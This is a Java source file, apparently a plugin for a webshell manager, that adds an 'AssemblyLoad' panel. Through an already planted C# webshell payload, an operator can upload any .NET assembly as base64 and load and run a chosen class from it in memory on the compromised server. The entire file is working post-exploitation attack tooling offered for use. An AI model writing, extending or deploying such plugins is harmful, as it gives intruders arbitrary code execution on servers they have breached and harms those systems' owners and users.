package shells.plugins.wat4r;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.Objects;
import javax.swing.*;

import shells.plugins.generic.RealCmd;
import util.automaticBindClick;
import util.functions;
import util.http.Parameter;
import util.http.ReqParameter;

@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "AssemblyLoad", DisplayName = "AssemblyLoad")
public class AssemblyLoad implements Plugin {
    private static final String CLASS_NAME = "AssemblyLoad.Run";

    private final JPanel panel;

    private final JButton selectButton;

    private final JButton runButton;

    private final RTextArea resultTextArea;
    private final JSplitPane realSplitPane;
    private final JTextField instanceTextField;
    private final JLabel instanceLabel;

    private String assemblyFile = "";

    private boolean loadState;

    private ShellEntity shellEntity;

    private Payload payload;

    private Encoding encoding;

    public AssemblyLoad() {
        this.panel = new JPanel(new BorderLayout());
        this.selectButton = new JButton("Select Assembly");
        this.instanceLabel = new JLabel("Instance:");
        this.instanceTextField = new JTextField("TestLibrary.TestClass", 42);
        this.runButton = new JButton("Load");
        this.resultTextArea = new RTextArea();

        JPanel realTopPanel = new JPanel();
        realTopPanel.add(selectButton);
        realTopPanel.add(instanceLabel);
        realTopPanel.add(instanceTextField);
        realTopPanel.add(runButton);
        realTopPanel.add(resultTextArea);

        this.realSplitPane = new JSplitPane();
        this.realSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.realSplitPane.setDividerSize(0);
        this.realSplitPane.setTopComponent(realTopPanel);
        this.realSplitPane.setTopComponent(realTopPanel);
        this.realSplitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(this.realSplitPane);
    }

    public boolean load() {
        if (!this.loadState) {
            try {
                String filePath = "plugins/AssemblyLoad/assets/AssemblyLoad.dll";
                byte[] bytes = Files.readAllBytes(Paths.get(filePath));
                InputStream inputStream = new ByteArrayInputStream(bytes);
                byte[] data = functions.readInputStream(inputStream);
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                } else {
                    GOptionPane.showMessageDialog(this.panel, "Load fail!", "Prompt", 2);
                }
            } catch (Exception e) {
                this.resultTextArea.append(e.getMessage() + "\n");
            }
        }
        return this.loadState;
    }

    private void selectButtonClick(ActionEvent actionEvent) {
        JFileChooser assemblyChooser = new JFileChooser();
        assemblyChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        assemblyChooser.showDialog(new JLabel(), "Select");
        File file = assemblyChooser.getSelectedFile();
        this.assemblyFile = file.getAbsolutePath();
        this.resultTextArea.append("Assembly file: " + this.assemblyFile + "\n");
    }

    private void runButtonClick(ActionEvent actionEvent) {
        if (!Objects.equals(this.assemblyFile, "")) {
            String assemblyFileBase64 = readFileToBase64(this.assemblyFile);
            if (load()) {
                ReqParameter parameter = new ReqParameter();
                parameter.add("assemblyFileBase64", assemblyFileBase64);
                String instanceName = this.instanceTextField.getText();
                instanceName = instanceName.replaceAll(" ", "");
                if (instanceName.equals("")) {
                    this.resultTextArea.append("Instance is null!" + "\n");
                    return;
                }
                parameter.add("instanceName", instanceName);
                String result = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", parameter));
                String resultMsg;
                if (Objects.equals(result, "1")) {
                    resultMsg = "Load success!";
                } else {
                    resultMsg = result;
                }
                this.resultTextArea.append("result: " + resultMsg + "\n");
            } else {
                this.resultTextArea.append("Load fail!" + "\n");
            }
        } else {
            GOptionPane.showMessageDialog(this.panel, "Assembly file not select!", "Prompt", JOptionPane.WARNING_MESSAGE);
        }
    }

    private String readFileToBase64(String filePath) {
        try {
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            this.resultTextArea.append(e.getMessage() + "\n");
            return "";
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
